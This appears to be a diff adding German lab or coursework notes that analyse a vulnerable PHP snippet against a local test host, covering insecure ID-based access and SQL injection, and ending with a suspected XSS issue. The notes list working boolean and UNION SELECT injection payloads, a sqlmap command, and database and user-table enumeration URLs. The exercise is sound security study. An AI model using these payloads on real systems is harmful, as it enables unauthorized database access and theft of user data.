@@ -1,0 +1,44 @@
+2.
+der Code :         
+	$res = $db->query("SELECT name FROM Users WHERE id = ". $_REQUEST['id'])->fetch(PDO::FETCH_ASSOC); 
+        echo "Willkommen". $res['name'] ." <a href='/delete'>(Account löschen)</a>"; 
+
+beinhaltet mehrere Schwachstellen. 
+
+2.1. Zugriff auf den Nutzer über die id: hier kann idR auf jeden Nutzer der Datenbank zugegriffen werden:
+ falls in der Datenbank autoincrement genutzt wird können einfach alle Ids 1 bis x bzw 0 bis x ausprobiert
+werden.
+ansonsten ist es auch über bruteforcing mit diversen listen möglich Nutzer IDs zu finden wenn auto increment
+nicht an ist.
+
+Empfehlung: Kombination mehrerer Parameter für die Access Control.
+
+
+2.2: SQLinjections:
+manuell Bool Based: http://192.168.2.110:8080/?id=2%20or%201=1
+sqlmap : sqlmap -u http://192.168.2.110:8080/?id=1
+
+direkt ein treffer mit union select ---> sehr kritisch da direkt die Möglichkeit gegeben ist an Datenbank-
+informationen heranzukommen.
+Payload: http://192.168.2.110:8080/?id=id=-9546 UNION ALL SELECT CONCAT(0x716b767871,0x6e536d756849794f6e7178524857784a57436a54554345764778486d6e54674873555962414b6541,0x7170787871)-- -
+vereinfacht: http://192.168.2.110:8080/?id=id=-9546 UNION ALL SELECT 1-- -
+oder http://192.168.2.110:8080/?id=-9546%20UNION%20ALL%20SELECT%201--%20- doppelID funktioniert auch bei mir ?
+
+Datenbank enumeration:
+http://192.168.2.110:8080/?id=id=-9546%20UNION%20ALL%20SELECT%20@@version--%20-
+http://192.168.2.110:8080/?id=-9546%20UNION%20ALL%20SELECT%20database()--%20-
+http://192.168.2.110:8080/?id=-9546%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20%27wordpress%27--
+http://192.168.2.110:8080/?id=-9546%20UNION%20SELECT%20name%20%20FROM%20users%20WHERE%20id%20=%201--%20-
+
+etc.....
+
+Keine Treffer:
+http://192.168.2.110:8080/?id=1%20union%20select%201--%20-
+http://192.168.2.110:8080/?id=id=-9546%20UNION%20ALL%20SELECT%20*%20FROM%20my_database.users;--%20-
+
+
+
+
+ich vermute noch eine XSS Schwachstelle hier:
+
+
